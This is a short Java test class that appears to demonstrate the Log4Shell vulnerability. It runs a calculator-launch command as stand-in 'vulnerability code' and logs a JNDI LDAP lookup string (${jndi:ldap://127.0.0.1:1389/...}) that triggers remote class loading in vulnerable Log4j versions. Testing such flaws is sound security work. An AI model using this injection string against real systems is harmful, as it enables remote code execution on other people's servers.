package com.huyong.spring.logger;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public class Test {
    public static void main(String[] args) {
        try {
            System.out.println("执行漏洞代码");
            String[] commands = {"open", "/System/Applications/Calculator.app"};
            Process pc = Runtime.getRuntime().exec(commands);
            pc.waitFor();
            System.out.println("完成执行漏洞代码");
        } catch (Exception e) {
            e.printStackTrace();
        }
        Logger logger = LoggerFactory.getLogger(Test.class);
        System.out.println(logger.getClass());
        logger.error("${jndi:ldap://127.0.0.1:1389/Log4jTest}");
    }
}
